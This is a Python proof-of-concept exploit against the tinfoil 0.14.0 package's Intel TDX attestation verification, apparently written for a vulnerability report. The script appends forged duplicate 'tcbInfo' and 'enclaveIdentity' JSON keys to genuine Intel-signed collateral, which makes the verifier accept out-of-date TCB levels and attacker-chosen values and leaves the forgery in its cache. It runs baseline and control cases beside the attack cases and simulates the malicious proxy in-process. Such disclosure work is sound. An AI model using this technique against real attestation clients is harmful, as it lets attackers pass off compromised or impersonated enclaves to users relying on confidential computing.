"""
PoC 2 (tightened): end-to-end through tinfoil 0.14.0 (PyPI wheel) entry point
Document.verify()  [the exact call SecureClient.verify() makes, client.py]
  -> verify_tdx_attestation_v2 -> verify_tdx_attestation
     -> parse_quote / verify_tdx_quote   (real Intel PCK chain, QE report sig, AK binding, quote sig)
     -> validate_tdx_policy
     -> validate_collateral -> fetch_collateral (TCB Info, QE Identity, PCK CRL, Root CRL
        all fetched from https://tdx-proxy.tinfoil.sh/...) -> freshness -> revocation
        -> TCB status -> TDX module identity -> QE identity

Every input is a genuine Intel-signed artifact (google/go-tdx-guest v0.3.1 testdata):
real SPR-E4 TDX quote + real PCK chain, real TCB Info v3 (fmspc 50806f000000),
real QE Identity v2, real PCK CRL, real Root CA CRL, real PCS issuer-chain headers.

Environment knobs (none touch collateral logic):
  * clock frozen to 2023-06-30 (inside validity of every genuine 2023 artifact);
  * requests.get replaced by an in-process stand-in for the delivery path
    (tdx-proxy.tinfoil.sh) -- the attacker;
  * empty private cache dir;
  * _DEFAULT_CONFIG policy constants (MR_SEAM allowlist, TD_ATTRIBUTES, XFAM, min
    TEE_TCB_SVN) set to this 2023 sample quote's values, because the shipped
    allowlist targets Tinfoil's 2025/26 TDX modules and would reject this sample
    quote *before* collateral is evaluated. min_tcb_evaluation_data_number is
    left at the shipped default (19) except in scenario B.

Usage: python -I poc2_e2e_document_verify.py <data_dir>
"""
import base64
import copy
import dataclasses
import datetime as _dt
import gzip
import json
import os
import sys
import tempfile
from unittest import mock

import requests
from cryptography import x509
from cryptography.hazmat.primitives import serialization

import tinfoil
import tinfoil.attestation.cert_utils as cu
import tinfoil.attestation.collateral_tdx as ct
import tinfoil.attestation.attestation_tdx as at
from tinfoil.attestation.attestation import Document
from tinfoil.attestation.types import PredicateType
from tinfoil.attestation.abi_tdx import parse_quote

DATA = sys.argv[1]
FROZEN = _dt.datetime(2023, 6, 30, tzinfo=_dt.timezone.utc)


class FrozenDateTime(_dt.datetime):
    @classmethod
    def now(cls, tz=None):
        return FROZEN.astimezone(tz) if tz else FROZEN.replace(tzinfo=None)


cu.datetime = FrozenDateTime
ct.datetime = FrozenDateTime


def rd(name, mode="rb"):
    with open(os.path.join(DATA, name), mode) as f:
        return f.read()


QUOTE = rd("quote.dat")
GENUINE_TCB = rd("tcb_info.json").rstrip()
GENUINE_QE = rd("qe_identity.json").rstrip()
TCB_CHAIN = rd("tcbInfoIssuerChain.txt", "r").strip()
QE_CHAIN = rd("qeIdentityIssuerChain.txt", "r").strip()
PCKCRL_CHAIN = rd("pckCrlIssuerChain.txt", "r").strip()
# Intel PCS /pckcrl returns PEM by default; tinfoil parses it with load_pem_x509_crl.
PCK_CRL_PEM = x509.load_der_x509_crl(rd("pckcrl.der")).public_bytes(serialization.Encoding.PEM)
ROOT_CRL_DER = rd("rootcrl.der")


def append_duplicate(genuine: bytes, key: str, forged_obj: dict) -> bytes:
    """Attacker transform: keep Intel's signed bytes intact, append a 2nd `key` member."""
    assert genuine.endswith(b"}")
    return genuine[:-1] + b',"' + key.encode() + b'":' + json.dumps(
        forged_obj, separators=(",", ":")).encode() + b"}"


def make_proxy(tcb_body: bytes, qe_body: bytes, log: list):
    """Stand-in for https://tdx-proxy.tinfoil.sh (the attacker-controlled delivery path)."""

    def _get(url, timeout=None, **kw):
        log.append(url)
        r = requests.Response()
        r.status_code = 200
        r.url = url
        if "/tdx/certification/v4/tcb?" in url:
            r._content = tcb_body
            r.headers["TCB-Info-Issuer-Chain"] = TCB_CHAIN
        elif "/tdx/certification/v4/qe/identity" in url:
            r._content = qe_body
            r.headers["SGX-Enclave-Identity-Issuer-Chain"] = QE_CHAIN
        elif "/sgx/certification/v4/pckcrl?ca=platform" in url:
            r._content = PCK_CRL_PEM
            r.headers["SGX-PCK-CRL-Issuer-Chain"] = PCKCRL_CHAIN
        elif url.endswith("/certificates.trustedservices.intel.com/IntelSGXRootCA.der"):
            r._content = ROOT_CRL_DER
        else:
            raise AssertionError(f"unexpected URL {url}")
        assert url.startswith("https://tdx-proxy.tinfoil.sh/"), url
        return r

    return _get


def run(label, tcb_body, qe_body, cfg, cache_dir, network=True):
    log = []
    getter = make_proxy(tcb_body, qe_body, log) if network else _no_network
    doc = Document(format=PredicateType.TDX_GUEST_V2,
                   body=base64.b64encode(gzip.compress(QUOTE)).decode())
    with mock.patch.object(ct, "_TDX_CACHE_DIR", cache_dir), \
         mock.patch.object(ct.requests, "get", getter), \
         mock.patch.object(at, "_DEFAULT_CONFIG", cfg):
        try:
            v = doc.verify()
            # re-run the orchestrator to show the tcb_level it settled on
            res = at.verify_tdx_attestation(doc.body, config=cfg)
            print(f"[{label}] ACCEPTED by Document.verify(): measurement.type={v.measurement.type.value}")
            print(f"      tls_key_fp={v.public_key_fp[:16]}... hpke={v.hpke_public_key[:16]}...")
            print(f"      tcb_level.status={res.tcb_level.tcb_status.value} "
                  f"tcbEvalNum(TCB Info)={res.collateral.tcb_info.tcb_info.tcb_evaluation_data_number} "
                  f"nextUpdate={res.collateral.tcb_info.tcb_info.next_update}")
            return True
        except Exception as e:  # noqa: BLE001
            print(f"[{label}] REJECTED: {type(e).__name__}: {e}")
            return False
        finally:
            if log:
                print("      fetched:", *sorted(set(log)), sep="\n        ")


def _no_network(*a, **k):
    raise AssertionError("network must not be used")


def main():
    print("tinfoil package:", tinfoil.__file__)
    q = parse_quote(QUOTE)
    b = q.td_quote_body
    shipped = at.TdxVerificationConfig()
    cfg = dataclasses.replace(
        shipped,
        accepted_mr_seams=(b.mr_seam,),
        expected_td_attributes=b.td_attributes,
        expected_xfam=b.xfam,
        expected_minimum_tee_tcb_svn=b.tee_tcb_svn,
    )
    assert cfg.min_tcb_evaluation_data_number == ct.DEFAULT_MIN_TCB_EVALUATION_DATA_NUMBER == 19
    cfg15 = dataclasses.replace(cfg, min_tcb_evaluation_data_number=15)

    # ---- attacker's forged tcbInfo (appended as a duplicate key) --------------
    genuine_tcb = json.loads(GENUINE_TCB)["tcbInfo"]
    print("genuine TCB levels (sgx comps / pcesvn / status):")
    for lvl in genuine_tcb["tcbLevels"]:
        print("   ", [c["svn"] for c in lvl["tcb"]["sgxtcbcomponents"]][:8], lvl["tcb"]["pcesvn"], lvl["tcbStatus"])
    forged = copy.deepcopy(genuine_tcb)
    zero16 = [{"svn": 0} for _ in range(16)]
    forged.update(
        tcbEvaluationDataNumber=99,
        nextUpdate="2099-01-01T00:00:00Z",
        tcbLevels=[{"tcb": {"sgxtcbcomponents": zero16, "pcesvn": 0, "tdxtcbcomponents": zero16},
                    "tcbDate": "2023-02-15T00:00:00Z", "tcbStatus": "UpToDate"}],
        tdxModuleIdentities=[{"id": "TDX_00", "mrsigner": "00" * 48, "attributes": "0000000000000000",
                              "attributesMask": "FFFFFFFFFFFFFFFF",
                              "tcbLevels": [{"tcb": {"isvsvn": 0}, "tcbDate": "2023-02-15T00:00:00Z",
                                             "tcbStatus": "UpToDate"}]}],
    )
    dup_tcb = append_duplicate(GENUINE_TCB, "tcbInfo", forged)
    # Control: same forgery applied *in place* (no duplicate key) must be rejected.
    inplace_tcb = GENUINE_TCB.replace(b'"tcbStatus":"OutOfDate"', b'"tcbStatus":"UpToDate"')
    assert inplace_tcb != GENUINE_TCB

    genuine_qe = json.loads(GENUINE_QE)["enclaveIdentity"]
    f_qe = copy.deepcopy(genuine_qe)
    f_qe.update(mrsigner="41" * 32, tcbEvaluationDataNumber=99, nextUpdate="2099-01-01T00:00:00Z")
    dup_qe_mrsigner = append_duplicate(GENUINE_QE, "enclaveIdentity", f_qe)
    f_qe2 = copy.deepcopy(genuine_qe)
    f_qe2.update(tcbEvaluationDataNumber=99, nextUpdate="2099-01-01T00:00:00Z")
    dup_qe_fresh = append_duplicate(GENUINE_QE, "enclaveIdentity", f_qe2)

    results = {}
    with tempfile.TemporaryDirectory() as d:
        print("\n== A (baseline): genuine Intel collateral, SHIPPED config (min tcbEvaluationDataNumber 19)")
        results["A"] = run("A", GENUINE_TCB, GENUINE_QE, cfg, os.path.join(d, "A"))
        print("\n== B (baseline): genuine Intel collateral, min tcbEvaluationDataNumber=15 (value current in mid-2023)")
        results["B"] = run("B", GENUINE_TCB, GENUINE_QE, cfg15, os.path.join(d, "B"))
        print("\n== C (control): in-place edit of Intel's signed tcbInfo (OutOfDate->UpToDate), config as B")
        results["C"] = run("C", inplace_tcb, GENUINE_QE, cfg15, os.path.join(d, "C"))
        print("\n== D (attack vs B): identical to B except a forged duplicate 'tcbInfo' is appended")
        results["D"] = run("D", dup_tcb, GENUINE_QE, cfg15, os.path.join(d, "D"))
        print("\n== G (attack vs A): SHIPPED config; forged duplicate 'tcbInfo' + duplicate 'enclaveIdentity'"
              " (Intel MRSIGNER kept, only tcbEvalNum/nextUpdate forged)")
        results["G"] = run("G", dup_tcb, dup_qe_fresh, cfg, os.path.join(d, "G"))
        print("\n== E (persistence): next verification with NO network at all -> served from G's poisoned cache")
        results["E"] = run("E", None, None, cfg, os.path.join(d, "G"), network=False)
        print("\n== F (QE identity is attacker-controlled end-to-end): duplicate 'enclaveIdentity' with"
              " mrsigner=41..41; the genuine Intel QE is now judged against the attacker's MRSIGNER")
        results["F"] = run("F", dup_tcb, dup_qe_mrsigner, cfg, os.path.join(d, "F"))
    print("\nSUMMARY:", {k: ("ACCEPT" if v else "REJECT") for k, v in results.items()})
    expected = dict(A=False, B=False, C=False, D=True, G=True, E=True, F=False)
    ok = results == expected
    print("matches expected:", ok)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
